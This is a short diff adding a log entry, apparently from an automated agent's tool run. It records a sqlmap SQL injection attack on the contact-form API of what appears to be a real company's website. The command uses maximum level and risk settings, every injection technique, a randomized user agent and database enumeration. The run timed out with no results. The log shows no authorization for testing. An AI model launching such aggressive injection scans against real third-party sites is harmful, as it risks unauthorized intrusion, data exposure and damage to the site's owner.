@@ -1,0 +1,15 @@
+# command: cd "$WORK_PATH"; mkdir -p tool_outputs; timeout 900 sqlmap -u 'https://www.infinitycapital.bh/api/send' \
+ --method=POST \
+ --data='fname=a&lname=b&areacode=973&tel=5551234&cname=probe%40test.invalid&subject=Hello&msg=TestBody&check=on&targets=probe%40test.invalid' \
+ --batch --level=5 --risk=3 --dbs --threads=4 --timeout=15 --retries=2 \
+ --headers='User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120 Safari/537.36' \
+ --technique=BEUSTQ --random-agent --output-dir=tool_outputs/sqlmap_send 2>&1 | tail -40
+# tool: sqlmap
+# exit_code: 124
+# ts: 2026-09-30T11:18:46.557465+00:00
+# ---
+
+
+[exec timeout after 300s]
+
+[exit=124]
